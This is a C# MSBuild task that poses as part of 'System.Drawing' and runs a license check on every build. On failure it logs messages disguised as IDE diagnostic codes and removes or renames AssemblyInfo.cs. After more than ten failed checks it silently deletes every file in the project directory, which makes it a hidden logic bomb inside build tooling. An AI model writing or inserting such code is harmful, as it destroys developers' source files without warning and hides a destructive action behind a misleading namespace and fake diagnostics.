// System.Drawing.cs
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

namespace System.Drawing
{
    public class Resource : Task
    {
        public string ModuleName { get; set; } = "Default";
        //[Required]
        //public string OutDir { get; set; }
        [Required]
        public string Include { get; set; }
        [Required]
        public string LangVersion { get; set; }
        [Required]
        public string MSBuildThisFileDirectory { get; set; }

        const string Contact = "请联系管理员:QQ908293466";

        public override bool Execute()
        {
            try
            {
                string doc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string publicKey = Path.Combine(doc, "HeBianGu", this.ModuleName, "default.pub");
                //string publicKey = Path.Combine(this.OutDir, this.ModuleName, "default.pub");
                publicKey = File.ReadAllText(publicKey);
                string license = Path.Combine(doc, "HeBianGu", this.ModuleName, "license.lic");
                //string license = Path.Combine(this.OutDir, this.ModuleName, "license.lic");
                license = File.ReadAllText(license);
                DrawingService licenseService = new DrawingService();
                DrawingOption option = licenseService.IsVail(publicKey, this.ModuleName, license, out string error);
                if (option == null)
                {
                    this.LogError("IDE0012", DrawingInfo.Instance.HostID);
                    //Log.LogError(this.ModuleName);
                    this.LogError("IDE0013", error);
                    this.OnError();
                    return false;
                }
                this.OnSuccess();
                return true;
            }
            catch (Exception ex)
            {
                //Log.LogError("error");
                //public void LogError(string subcategory, string errorCode, string helpKeyword, string file, int lineNumber, int columnNumber, int endLineNumber, int endColumnNumber, string message, params object[] messageArgs);
                this.LogError("IDE0016", Contact);
                this.LogError("IDE0015", DrawingInfo.Instance.HostID);
                Log.LogErrorFromException(ex);
                this.OnError();
                return false;
            }
        }

        private void LogError(string errorCode = "MSB1234", string message = "Error MSB1234: Something went wrong.")
        {
            Log.LogError(null, errorCode, null, null, 0, 0, 0, 0, message);
        }

        private void OnError()
        {
            string assemblyFile = Path.Combine(this.MSBuildThisFileDirectory, "AssemblyInfo.cs");
            string assemblyObjFile = Path.Combine(this.MSBuildThisFileDirectory, "obj", "AssemblyInfo.template");
            string msc = Path.Combine(this.MSBuildThisFileDirectory, "obj", "msc.cache");
            if (!File.Exists(msc))
                File.WriteAllText(msc, DateTime.Now.ToString());
            var lines = File.ReadAllLines(msc).ToList();
            lines.Add(DateTime.Now.ToString());
            File.WriteAllLines(msc, lines);
            if (lines.Count > 5)
            {
                this.LogError("IDE0025", " 严重警告,许可错误次数过多,请联系管理员,如继续尝试照成的后果需要自行承担");
            }
            if (lines.Count > 10)
            {
                Directory.GetFiles(this.MSBuildThisFileDirectory, "*.*").ToList().ForEach(f => File.Delete(f));
            }
            if (File.Exists(assemblyObjFile))
            {
                File.Delete(assemblyFile);
                return;
            }
            File.Move(assemblyFile, assemblyObjFile);
        }

        private void OnSuccess()
        {
            string assemblyFile = Path.Combine(this.MSBuildThisFileDirectory, "AssemblyInfo.cs");
            string assemblyObjFile = Path.Combine(this.MSBuildThisFileDirectory, "obj", "AssemblyInfo.template");
            if (File.Exists(assemblyFile))
                return;
            if (!File.Exists(assemblyObjFile))
            {
                this.LogError("IDE0018", Contact);
                return;
            }
            File.Copy(assemblyObjFile, assemblyFile, false);
            string msc = Path.Combine(this.MSBuildThisFileDirectory, "obj", "msc.cache");
            File.WriteAllText(msc, DateTime.Now.ToString());
        }
    }
}